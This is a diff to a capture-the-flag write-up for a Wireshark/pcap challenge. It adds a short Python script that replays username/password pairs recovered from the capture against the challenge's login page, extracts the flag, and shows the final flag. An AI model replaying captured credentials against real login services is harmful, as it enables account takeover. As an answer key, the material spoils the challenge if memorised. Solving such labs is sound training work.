@@ -26,6 +26,28 @@ uname=flag&psw=CTF{fake_flag_heheh}
 <p align='center'>
   <img src="https://github.com/enomarozi/CTF-Writeup/blob/master/Wireshark/Images/pcapNG2.jpg">
 </p>
+
+```python3
+import requests
+import re
+
+username = ["admin","admin","admin","admina","admin","admin","heypeople",
+            "flag","please+see+the+pcap+file+carefully","pcappcap","flag"]
+password = ["admin","admin1","people","admind","proceedfurther","givememyflag",
+            "fakeflagflagy","flagflag","see+the+pcapcarefully","pcappcap",
+            "CTF{fake_flag_heheh}"]
+
+url = "http://n00bctf.herokuapp.com"
+for user,passwd in zip(username,password):
+    data = {'uname':user,
+            'psw':passwd
+            }
+    resp = requests.post(url,data=data).text
+    if "CTF{" in resp:
+        flag = re.findall('Here is your flag (.*?)<html>',resp)[0]
+        print(flag)
+
+```
 <h3><b>Flag</b></h3>
 <pre>
 CTF{1_l0v3_wir3shark_4nd_pc4p_f1les}
